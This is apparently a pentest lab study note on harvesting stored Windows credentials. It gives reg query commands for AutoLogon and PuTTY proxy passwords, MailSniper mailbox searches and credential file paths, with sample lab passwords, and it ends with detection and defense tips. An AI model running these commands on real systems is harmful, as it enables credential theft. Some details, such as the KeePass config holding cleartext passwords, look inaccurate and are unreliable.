# 🛰️ Credential Harvesting Techniques

## 🔍 Overview of Methods

[!ABSTRACT] This guide outlines various techniques for extracting stored credentials from a Windows environment, including files, registry keys, browser databases, and network configurations.

---

## 🗂 File-Based Credentials

### RDP Configuration Files
```cmd
# Common RDP configuration file locations:
C:\Users\jordan\.rdp            # Personal RDP settings
%USERPROFILE%\Documents\        # User documents folder with RDP files
%APPDATA%\Microsoft\Credentials\*.txt  # Saved credentials for various services

# Example of a .rdp file content:
; Generated by: rdpfile_writer v0.1
full address:s:transfer.inlanefreight.local
username:s:jordan
password autologin:i:1
password changed:i:1
```

### KeePass Database Extraction
```cmd
# Extract KeePass database passwords
C:\Users\jordan\AppData\Roaming\KeePass\KeePass.config.xml  # Configuration file

# Example output:
<Database>
    <Entry ID="7">
        <UserName>admin</UserName>
        <Password>MySuperSecureP@ssw0rd!</Password>
        ...
```

### FTP and SSH Configurations
```cmd
# Commonly stored in user directories or application-specific folders:
C:\Users\jordan\.ssh              # SSH keys and configurations
%USERPROFILE%\ftp                 # FTP configuration files

# Example FTP config file content:
user jordan
pass HTB_@cademy_j0rdan!
```

## 📧 Email Credential Mining

### MailSniper for Exchange
```powershell
[!WARNING] Ensure you have the necessary permissions to access the mail server.

# Search Exchange mailboxes for credentials using MailSniper
Import-Module .\MailSniper.psm1
Get-Mailbox -ResultSize Unlimited | ForEach-Object { Get-MailboxFolderStatistics $_.Identity -FolderScope SentItems }
Search-Mailbox -Identity jordan -SearchQuery "pass" -LogLevel Full

# Example output:
Mailbox          : jordan@inlanefreight.local
HitCount         : 1
TotalItemSize    : 20480 bytes (20 KiB)
ResultItems      : {Microsoft.Exchange.WebServices.Data.Item}
```

## 🗝️ Registry Credential Storage

### Windows AutoLogon
```cmd
# Check the AutoLogon configuration to find stored credentials.
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Example output:
AutoAdminLogon    REG_SZ    1
DefaultUserName   REG_SZ    htb-student
DefaultPassword   REG_SZ    HTB_@cademy_stdnt!
```

### PuTTY Proxy Credentials
```cmd
# Enumerate PuTTY sessions to check for proxy credentials.
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

# Check specific session for proxy configuration:
ProxyMethod       # 5 = HTTP proxy with credentials
ProxyHost         # Proxy server
ProxyUsername     # Proxy username
ProxyPassword     # Cleartext proxy password

# Example output:
ProxyUsername    REG_SZ    administrator
ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!
```

## ⚠️ Detection & Defense

### Detection Indicators
```cmd
# Monitor for:
- Browser database access patterns
- Registry queries for credential storage locations
- KeePass database file access
- SessionGopher PowerShell execution
- LaZagne process execution
- Unusual credential manager access
```

### Defensive Measures
```cmd
# Security practices:
- Disable AutoLogon or use encrypted storage
- Regular password manager audits
- Browser security policies
- Monitor credential extraction tools
- Network segregation for admin tools
- Least privilege for saved credentials
```

## 💡 Key Takeaways

1. **Multiple credential storage mechanisms** exist beyond files.
2. **Browser credentials** are easily extractable with tools.
3. **Password managers** can be cracked if master passwords are weak.
4. **Registry keys** often contain valuable stored credentials.
5. **Network configurations** may also store sensitive information.
